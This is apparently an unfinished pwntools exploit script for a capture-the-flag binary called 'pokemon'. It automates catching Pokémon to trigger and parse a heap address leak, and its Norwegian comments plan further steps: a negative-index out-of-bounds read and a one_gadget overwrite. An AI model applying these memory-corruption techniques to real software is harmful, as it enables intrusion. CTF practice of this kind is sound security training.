from pwn import *

p = process("./pokemon")
gdb.attach(p)

p.recvuntil(b"name:")
p.sendline(b"krloer")

log.info("Catching a pikachu")

p.recvuntil(b"> ")
while True:
    p.sendline(b"2")
    out = p.recv().decode()
    if "the pokemon fled!" not in out:
        if "Pikachu" in out:
            p.sendline(b"y")
            p.recvuntil(b"> ")
            break
        else:
            p.sendline(b"n")
            p.recvuntil(b"> ")

log.info("Catching four more pokemon")

i = 0
while i < 4:
    p.sendline(b"2")
    out = p.recv().decode()
    if "You just caught" in out:
        p.sendline(b"y")
        p.recvuntil(b"> ")
        i += 1

p.sendline(b"1")
p.recvuntil(b"Pikachu")
heap_leak = int(p.recvline().decode().split("|")[3].strip())
log.success(f"{hex(heap_leak)=}")


p.interactive()

"""
seg fault hvis battler med enkelte utenfor pokedex
prøv å battle med negativ index - kan lekke ting

UA��H��S��H��hH�T$@dH�%( is not strong enough to battle. :)


pikachu leaker heap hvis for mange pokemons

prøv å skrive over evolve med en onegadget kanskje?
"""
